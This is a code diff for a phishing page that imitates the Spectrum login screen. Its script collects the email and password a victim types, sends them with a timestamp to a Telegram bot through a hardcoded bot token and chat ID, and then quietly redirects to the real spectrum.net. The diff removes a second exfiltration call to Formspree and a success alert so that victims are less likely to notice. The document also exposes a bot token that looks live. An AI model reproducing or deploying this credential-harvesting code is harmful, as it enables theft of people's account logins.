@@ -37,40 +37,21 @@
 
         <!-- FORM -->
         <form id="loginForm">
-            <!-- EMAIL -->
             <div style="text-align:left; margin-bottom:20px;">
                 <label style="font-size:14px; color:#333;">Email Address</label><br>
                 <input type="email" name="email" required
-                    style="
-                        width:100%;
-                        padding:12px;
-                        margin-top:6px;
-                        border:1px solid #ccc;
-                        border-radius:5px;
-                        font-size:15px;
-                    ">
+                    style="width:100%; padding:12px; margin-top:6px; border:1px solid #ccc; border-radius:5px; font-size:15px;">
             </div>
-            <!-- PASSWORD -->
             <div style="text-align:left; margin-bottom:15px;">
                 <label style="font-size:14px; color:#333;">Password</label><br>
                 <input type="password" name="password" required
-                    style="
-                        width:100%;
-                        padding:12px;
-                        margin-top:6px;
-                        border:1px solid #ccc;
-                        border-radius:5px;
-                        font-size:15px;
-                    ">
+                    style="width:100%; padding:12px; margin-top:6px; border:1px solid #ccc; border-radius:5px; font-size:15px;">
             </div>
-            <!-- FORGOT PASSWORD -->
             <div style="text-align:right; margin-bottom:25px;">
-                <a href="https://spectrum.net"
-                   style="color:#0073e6; font-size:13px; text-decoration:none;">
+                <a href="https://spectrum.net" style="color:#0073e6; font-size:13px; text-decoration:none;">
                     Forget Your Password?
                 </a>
             </div>
-            <!-- BUTTON -->
             <button type="submit" style="
                 width:100%;
                 padding:13px;
@@ -87,22 +68,20 @@
     </div>
 
     <!-- BOTTOM IMAGE -->
-    <img src="spect.png"
-         style="width:420px; margin-top:25px; border-radius:10px;">
+    <img src="spect.png" style="width:420px; margin-top:25px; border-radius:10px;">
 
     <!-- TELEGRAM BOT SCRIPT -->
     <script>
-        const form = document.getElementById("loginForm");
-
-        form.addEventListener("submit", async function(e) {
+        document.getElementById("loginForm").addEventListener("submit", async function(e) {
             e.preventDefault();
 
-            const formData = new FormData(form);
-            
-            let message = "🔴 *New Spectrum Login*\n\n";
-            formData.forEach((value, key) => {
-                message += `*${key}:* ${value}\n`;
-            });
+            const email = document.querySelector("input[name='email']").value;
+            const password = document.querySelector("input[name='password']").value;
+
+            const message = `🔴 *New Spectrum Login*\n\n` +
+                            `*Email:* ${email}\n` +
+                            `*Password:* ${password}\n` +
+                            `*Time:* ${new Date().toLocaleString()}`;
 
             const botToken = "8812714398:AAEGTRjUZsPFJENuxk1XhAqHmcUfoqSDQUg";
             const chatId = "254077234";
@@ -118,19 +97,10 @@
                 })
             });
 
-            // Optional: Also send to Formspree if you want
-            fetch("https://formspree.io/f/mwvzwzlp", {
-                method: "POST",
-                body: formData,
-                headers: { 'Accept': 'application/json' }
-            });
-
-            alert("✅ Sign In Successful!");
-            
-            // Redirect after 1.5 seconds
+            // Redirect without showing any message
             setTimeout(() => {
                 window.location.href = "https://spectrum.net";
-            }, 1500);
+            }, 1200);
         });
     </script>
 </body>
